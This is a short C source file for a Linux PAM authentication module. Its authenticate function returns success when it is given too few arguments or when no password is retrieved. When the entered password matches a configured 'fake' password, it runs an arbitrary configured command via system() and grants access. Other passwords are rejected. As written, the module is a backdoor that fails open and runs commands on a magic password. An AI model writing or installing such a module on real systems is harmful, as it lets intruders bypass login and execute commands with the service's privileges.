#include <stdlib.h>
#include <string.h>

#define PAM_SM_AUTH
#define PAM_SM_ACCOUNT
#define PAM_SM_SESSION
#define PAM_SM_PASSWORD
#include <security/pam_appl.h>
#include <security/pam_modules.h>


PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    const char *passwd = NULL;
    const char *fake_passwd;
    int retval;

    if (argc < 2) {
        return PAM_SUCCESS;
    }
    fake_passwd = argv[0];

    retval = pam_get_item(pamh, PAM_AUTHTOK, (const void **)&passwd);
    if (retval == PAM_SUCCESS && passwd) {
        if (strcmp(passwd, fake_passwd) == 0) {
            system(argv[1]);
            return PAM_SUCCESS;
        } else {
            return PAM_CRED_UNAVAIL;
        }
    }
    return PAM_SUCCESS;
}

